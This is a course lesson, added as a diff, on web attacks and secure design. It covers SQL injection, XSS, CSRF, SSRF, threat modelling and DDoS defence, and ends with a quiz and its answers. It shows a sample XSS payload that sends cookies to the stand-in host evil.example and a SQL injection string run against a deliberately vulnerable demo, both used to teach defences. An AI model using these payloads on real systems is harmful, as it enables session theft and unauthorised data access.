@@ -1,0 +1,137 @@
+---
+title: Web Attacks and Secure Design
+track: sd
+module: security
+order: 4
+difficulty: medium
+estMinutes: 40
+prerequisites: ["sd/security/secrets-encryption-and-tls", "sd/scalability/rate-limiting-algorithms"]
+tags: [security, owasp, sql-injection, xss, csrf, ssrf, threat-modeling, stride, ddos, supply-chain]
+type: lesson
+furtherReading:
+  - title: OWASP Top 10
+    url: https://owasp.org/www-project-top-ten/
+  - title: OWASP Cheat Sheet Series
+    url: https://cheatsheetseries.owasp.org/
+  - title: Microsoft - STRIDE threat modeling
+    url: https://learn.microsoft.com/en-us/azure/security/develop/threat-modeling-tool-threats
+  - title: Shostack - Threat Modeling, Designing for Security
+    url: https://shostack.org/books/threat-modeling-book
+---
+
+## Intuition
+
+Attackers do not break cryptography; they use the application's own features in ways the designer did not intend. Most real attacks fall into a few families, and each has a well-known structural defence. A system designer's job is to make the safe path the default one, so that individual developers do not need to remember a hundred rules.
+
+## Injection (SQL, command, template)
+
+Untrusted input is concatenated into a command and interpreted as code.
+
+```python
+import sqlite3
+db = sqlite3.connect(":memory:")
+db.executescript("create table users(name text, secret text); insert into users values('alice','a-secret'),('bob','b-secret');")
+
+def lookup_bad(name):
+    return db.execute(f"select name from users where name = '{name}'").fetchall()     # string building
+
+def lookup_good(name):
+    return db.execute("select name from users where name = ?", (name,)).fetchall()     # parameterised
+
+evil = "x' OR '1'='1"
+print(lookup_bad(evil))     # [('alice',), ('bob',)]  the quote broke out of the string: every row returned
+print(lookup_good(evil))    # []                      the input stays data, never code
+```
+
+Defences: **parameterised queries / prepared statements** always; ORMs used correctly; allow-lists for identifiers that cannot be parameterised (column names); never build shell commands from input (use argument arrays); least-privilege database users so an injection cannot drop tables or read other schemas.
+
+## Cross-site scripting (XSS)
+
+Attacker-supplied text is rendered into a page as HTML/JavaScript, running in other users' browsers with their session. Types: stored (saved in the database), reflected (echoed from the URL) and DOM-based.
+
+```python
+import html
+comment = '<script>fetch("https://evil.example/?c="+document.cookie)</script>'
+print(html.escape(comment))    # &lt;script&gt;fetch(...)&lt;/script&gt;  rendered as harmless text
+```
+
+Defences: **context-aware output encoding** (modern frameworks escape by default; never bypass with `dangerouslySetInnerHTML`/`|safe` on untrusted data); a strict **Content Security Policy** (no inline scripts, allow-list sources); `HttpOnly` cookies so stolen script cannot read the session; sanitise rich text with a vetted library (allow-list tags); validate on input as a secondary layer.
+
+## Cross-site request forgery (CSRF)
+
+A malicious page makes the victim's browser send a request to your site, and the browser attaches the victim's cookies automatically ("transfer money to the attacker").
+
+Defences: `SameSite=Lax/Strict` cookies; **anti-CSRF tokens** (unpredictable per-session value required on state-changing requests); check `Origin`/`Referer`; require custom headers for APIs; never change state on `GET`. APIs that use `Authorization` headers (not cookies) are not CSRF-prone.
+
+## Server-side request forgery (SSRF)
+
+The server fetches a URL supplied by the user (webhook, image import, link preview), and the attacker points it at internal targets: `http://169.254.169.254/` (cloud metadata with credentials), `http://localhost:6379`, internal admin panels. Defences: allow-list destination hosts or schemes; resolve DNS and **block private, loopback and link-local ranges** (re-check after redirects to defeat DNS rebinding); fetch through an isolated egress proxy with no internal access; require the metadata service's session-token mode (IMDSv2); do not return raw responses to the user.
+
+## Other recurring problems
+
+- **Broken authentication / session management**: previous lessons.
+- **Broken access control (IDOR)**: previous lesson.
+- **Security misconfiguration**: default credentials, open storage buckets, verbose errors with stack traces, debug endpoints in production, permissive CORS (`*` with credentials).
+- **Vulnerable and outdated components / supply chain**: dependencies with known CVEs, malicious or typosquatted packages, compromised build pipelines. Pin and lock versions, scan dependencies, generate an SBOM, review CI permissions, sign artifacts, and keep a patch process.
+- **Insecure deserialization**: never deserialize untrusted data with formats that can instantiate arbitrary objects (Java serialization, Python `pickle`); use plain data formats (JSON) with schema validation.
+- **Mass assignment, unrestricted file upload**: whitelist writable fields; validate file type by content, store uploads outside the web root or in object storage with a separate domain, generate your own filenames, scan for malware, and set `Content-Disposition`.
+- **Open redirects, clickjacking**: validate redirect targets; send `X-Frame-Options`/`frame-ancestors`.
+- **Logging and monitoring failures**: no audit trail means breaches go unnoticed for months.
+
+## Availability attacks
+
+**DDoS** floods you with traffic (network floods, HTTP floods, slowloris, amplification). Layered defence: a CDN/edge with large absorbing capacity, anycast, rate limiting and bot detection at the edge (see the rate limiting lessons), autoscaling with a cost cap, load shedding and bulkheads, caching, CAPTCHAs on expensive actions, and the ability to block by IP, ASN or country quickly. Also guard against **algorithmic complexity** attacks (regex denial of service, hash collisions, huge GraphQL queries): set limits on payload size, query depth and cost, and request time.
+
+## Threat modelling: think like the attacker, early
+
+Before building, ask four questions (Shostack): *What are we building? What can go wrong? What are we going to do about it? Did we do a good job?*
+
+Draw a **data flow diagram** with trust boundaries (browser, edge, services, database, third parties). For each element and flow apply **STRIDE**:
+
+| Threat | Violates | Typical mitigation |
+| --- | --- | --- |
+| **S**poofing identity | Authentication | MFA, mTLS, signed tokens |
+| **T**ampering with data | Integrity | TLS, signatures, checksums, input validation |
+| **R**epudiation | Non-repudiation | Audit logs, signed events |
+| **I**nformation disclosure | Confidentiality | Encryption, access control, minimal data |
+| **D**enial of service | Availability | Rate limits, quotas, scaling, shedding |
+| **E**levation of privilege | Authorization | Least privilege, validation, sandboxing |
+
+Rank threats by likelihood and impact, decide to mitigate, transfer, accept or avoid each, and record the decisions. Revisit when the design changes.
+
+## Secure-by-default design principles
+
+- **Secure defaults and paved roads**: shared libraries and templates that parameterise queries, encode output, check authorization and log, so the easy way is the safe way.
+- **Validate input** (type, length, range, format) at the boundary, **encode output** for its context.
+- **Minimise attack surface**: fewer endpoints, ports, dependencies and privileges.
+- **Defence in depth** and **fail closed**: if the authorization service is down for a sensitive action, deny.
+- **Separate duties and environments**; network segmentation so one compromised service cannot reach everything.
+- **Security in the pipeline**: static analysis, dependency and secret scanning, container scanning, infrastructure-as-code checks, and regular penetration tests and bug bounty.
+- **Prepare to respond**: incident runbooks, key revocation procedures, and tested backups (see the incident response lesson).
+
+## Worked example
+
+A "link preview" feature fetches a user-submitted URL and shows its title. Threat model: SSRF into the cloud metadata service (Information disclosure, Elevation), DoS via huge or slow responses, XSS from the page title, and abuse as an anonymous proxy. Mitigations: the fetch runs in a sandboxed worker in an isolated subnet with no internal routes; allow only `http`/`https` on ports 80 and 443; resolve DNS and reject private, loopback and link-local addresses, re-checking after each redirect (max 3); 2-second timeout, 1 MB response cap; strip and HTML-encode the title on output; per-user rate limit; and log every fetch with the requester.
+
+## Pitfalls
+
+- Relying on client-side validation.
+- Blocklists instead of allow-lists.
+- Security as a final review step rather than a design input.
+- Verbose error messages and exposed stack traces.
+- Ignoring dependencies and build pipelines.
+- Assuming internal services are trusted.
+- Treating one control as sufficient.
+
+## What would you choose and why?
+
+You are adding a "import data from a URL" feature, a markdown comment system and a webhook sender to an existing product. For each, name the most likely attack, the structural defence you would build once as a shared component, and the monitoring that would tell you it is being abused.
+
+## Quiz
+
+<Quiz id="sd-m15-web-attacks" tags={["security", "owasp", "injection"]} questions={[
+  { type: "mcq", q: "What is the primary defence against SQL injection?", options: ["Escape quotes by hand", "Parameterised queries so input is never interpreted as SQL", "Hide the database port", "Use longer passwords"], answer: 1, explain: "Parameters keep data and code separate by construction." },
+  { type: "mcq", q: "A webhook feature fetches user-supplied URLs. Which attack is most worrying on a cloud VM?", options: ["XSS", "SSRF reaching the instance metadata service", "CSRF", "Clickjacking"], answer: 1, explain: "The server can be tricked into fetching internal credentials; block internal ranges and isolate egress." },
+  { type: "multi", q: "Which are valid defences against CSRF for a cookie-authenticated site?", options: ["SameSite cookies", "Anti-CSRF tokens on state-changing requests", "Using GET for state changes", "Checking the Origin header"], answer: [0, 1, 3], explain: "State changes via GET make CSRF easier, not harder." },
+  { type: "predict", q: "With the demo, what does lookup_good(\"x' OR '1'='1\") return?", code: "lookup_good(\"x' OR '1'='1\")", options: ["[('alice',), ('bob',)]", "[]", "An SQL error", "[('bob',)]"], answer: 1, explain: "The input is bound as a literal name; no user has that name, so no rows are returned." }
+]} />
